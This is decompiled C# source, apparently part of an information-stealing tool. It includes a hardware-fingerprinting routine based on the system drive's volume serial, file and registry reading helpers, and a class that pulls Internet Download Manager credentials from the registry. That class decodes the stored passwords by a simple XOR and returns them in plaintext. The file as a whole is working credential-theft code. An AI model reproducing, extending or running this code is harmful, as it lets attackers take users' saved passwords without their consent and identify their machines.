using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;

[StandardModule]
internal sealed class P
{
    public static string Cut(string sInhalt, string sText, string stext2)
    {
        string str;
        try
        {
            str = Strings.Split(Strings.Split(sInhalt, sText, -1, CompareMethod.Binary)[1], stext2, -1, CompareMethod.Binary)[0];
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            str = "No Data";
            ProjectData.ClearProjectError();
        }
        return str;
    }

    [DllImport("kernel32", EntryPoint="GetVolumeInformationA", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
    private static extern int GetVolumeInformation([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);
    public static string HWD()
    {
        string str;
        try
        {
            int num;
            string lpVolumeNameBuffer = null;
            int lpMaximumComponentLength = 0;
            int lpFileSystemFlags = 0;
            string lpFileSystemNameBuffer = null;
            GetVolumeInformation(ref Interaction.Environ("SystemDrive") + @"\", ref lpVolumeNameBuffer, 0, ref num, ref lpMaximumComponentLength, ref lpFileSystemFlags, ref lpFileSystemNameBuffer, 0);
            str = Conversion.Hex(num);
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            str = null;
            ProjectData.ClearProjectError();
        }
        return str;
    }

    public static string ReadFile(string sFile)
    {
        string str;
        int num2;
        try
        {
            int num3;
        Label_0000:
            ProjectData.ClearProjectError();
            int num = 1;
        Label_0007:
            num3 = 2;
            StreamReader reader = new StreamReader(sFile);
        Label_0011:
            num3 = 3;
            str = reader.ReadToEnd().ToString();
            goto Label_0080;
        Label_0022:
            num2 = 0;
            switch ((num2 + 1))
            {
                case 1:
                    goto Label_0000;

                case 2:
                    goto Label_0007;

                case 3:
                    goto Label_0011;

                case 4:
                    goto Label_0080;

                default:
                    goto Label_0075;
            }
        Label_0042:
            num2 = num3;
            switch (num)
            {
                case 0:
                    goto Label_0075;

                case 1:
                    goto Label_0022;
            }
        }
        catch (Exception exception1) when (?)
        {
            ProjectData.SetProjectError(exception1);
            goto Label_0042;
        }
    Label_0075:
        throw ProjectData.CreateProjectError(-2146828237);
    Label_0080:
        if (num2 != 0)
        {
            ProjectData.ClearProjectError();
        }
        return str;
    }

    public static string ReadLine(string filename, int line)
    {
        string str;
        try
        {
            string[] strArray = MyProject.Computer.FileSystem.ReadAllText(filename, Encoding.Default).Split(new char[] { '\r' });
            if (line > 0)
            {
                return strArray[line - 1];
            }
            if (line < 0)
            {
                return strArray[(strArray.Length + line) - 1];
            }
            str = "";
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            str = "";
            ProjectData.ClearProjectError();
        }
        return str;
    }

    public static string RegRead(string hKey)
    {
        string str;
        int num2;
        try
        {
            int num3;
        Label_0000:
            num3 = 1;
            object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
        Label_0018:
            ProjectData.ClearProjectError();
            int num = 1;
        Label_0020:
            num3 = 3;
            object[] arguments = new object[] { hKey };
            bool[] copyBack = new bool[] { true };
            if (copyBack[0])
            {
                hKey = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments[0]), typeof(string));
            }
            str = Conversions.ToString(NewLateBinding.LateGet(objectValue, null, "RegRead", arguments, null, null, copyBack));
            goto Label_00DE;
        Label_007A:
            num2 = 0;
            switch ((num2 + 1))
            {
                case 1:
                    goto Label_0000;

                case 2:
                    goto Label_0018;

                case 3:
                    goto Label_0020;

                case 4:
                    goto Label_00DE;

                default:
                    goto Label_00D3;
            }
        Label_009C:
            num2 = num3;
            switch (num)
            {
                case 0:
                    goto Label_00D3;

                case 1:
                    goto Label_007A;
            }
        }
        catch (Exception exception1) when (?)
        {
            ProjectData.SetProjectError(exception1);
            goto Label_009C;
        }
    Label_00D3:
        throw ProjectData.CreateProjectError(-2146828237);
    Label_00DE:
        if (num2 != 0)
        {
            ProjectData.ClearProjectError();
        }
        return str;
    }

    public class IDM
    {
        public static object Recover()
        {
            List<RecoveredBrowserAccount> list = new List<RecoveredBrowserAccount>();
            string name = @"Software\DownloadManager\Passwords\";
            IntPtr hKey = new IntPtr(-2147483647);
            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(name);
                if (key.GetSubKeyNames().Length == 0)
                {
                    return list;
                }
                foreach (string str3 in key.GetSubKeyNames())
                {
                    RegistryKey key2 = key.OpenSubKey(str3);
                    SafeKeyHandle phkResult = null;
                    int num2 = NativeMethods.RegOpenKeyEx(hKey, name + str3, 0, 0x20019, out phkResult);
                    byte[] data = new byte[0x101];
                    byte[] buffer = new byte[0x101];
                    int type = 0;
                    int dataSize = 0x100;
                    num2 = NativeMethods.RegQueryValueEx(phkResult, "User", 0, out type, data, ref dataSize);
                    dataSize = 0;
                    type = 0x100;
                    num2 = NativeMethods.RegQueryValueEx(phkResult, "EncPassword", 0, out dataSize, buffer, ref type);
                    RecoveredBrowserAccount item = new RecoveredBrowserAccount {
                        URL = str3
                    };
                    int num = 0;
                    int num8 = data.Length - 1;
                    for (int i = 0; i <= num8; i++)
                    {
                        if (data[i] == 0)
                        {
                            break;
                        }
                        num++;
                    }
                    data = (byte[]) Utils.CopyArray((Array) data, new byte[(num - 1) + 1]);
                    item.UserName = Encoding.Default.GetString(data);
                    num = 0;
                    string str2 = null;
                    int num9 = buffer.Length - 1;
                    for (int j = 0; j <= num9; j++)
                    {
                        if (buffer[j] == 0)
                        {
                            break;
                        }
                        str2 = str2 + Conversions.ToString(Strings.ChrW(buffer[j] ^ 15));
                    }
                    item.Password = str2;
                    item.Browser = "Internet Download Manager";
                    list.Add(item);
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Exception exception = exception1;
                ProjectData.ClearProjectError();
            }
            return list;
        }

        [SuppressUnmanagedCodeSecurity]
        public class NativeMethods
        {
            [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success), DllImport("Advapi32", SetLastError=true)]
            public static extern int RegCloseKey(IntPtr hKey);
            [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail), DllImport("Advapi32", CharSet=CharSet.Unicode, SetLastError=true)]
            public static extern int RegOpenKeyEx([In] IntPtr hKey, [In] string subKey, int options, [In] int samDesired, out P.IDM.SafeKeyHandle phkResult);
            [DllImport("Advapi32", CharSet=CharSet.Unicode, SetLastError=true)]
            public static extern int RegQueryValueEx([In] P.IDM.SafeKeyHandle hKey, [In] string lpValueName, int reserved, out int type, [Out] byte[] data, [In, Out] ref int dataSize);
        }

        public class SafeKeyHandle : SafeHandle
        {
            public SafeKeyHandle() : base(IntPtr.Zero, true)
            {
            }

            protected override bool ReleaseHandle() => 
                (P.IDM.NativeMethods.RegCloseKey(base.handle) == 0);

            public override bool IsInvalid =>
                (base.handle == IntPtr.Zero);
        }
    }
}

